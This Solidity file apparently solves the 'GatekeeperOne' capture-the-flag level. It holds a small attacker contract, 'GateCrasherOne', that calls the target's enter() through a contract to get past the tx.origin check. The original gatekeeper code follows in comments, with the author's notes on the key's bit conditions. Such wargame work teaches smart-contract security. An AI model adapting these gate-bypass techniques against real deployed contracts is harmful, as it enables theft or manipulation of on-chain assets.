//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./SafeMath.sol";
import "hardhat/console.sol";


interface GatekeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateCrasherOne {

    function enter(address _gate, bytes8 _key) external returns (bool) {
        return GatekeeperOne(_gate).enter(_key);
    }
}

// contract GatekeeperOne {

//   using SafeMath for uint256;
//   address public entrant;

//   modifier gateOne() {
//     require(msg.sender != tx.origin);
//     _;
//   }

//   modifier gateTwo() {
//     require(gasleft().mod(8191) == 0);
//     _;
//   }

//   modifier gateThree(bytes8 _gateKey) {
//       // second half == last quarter: third quarter must be 0s?
//       require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
//       // second half != full: first half not all 0s
//       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
//       // second half == last 16 bits of origin
//       require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
//     _;
//   }

//   function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
//     entrant = tx.origin;
//     return true;
//   }
// }
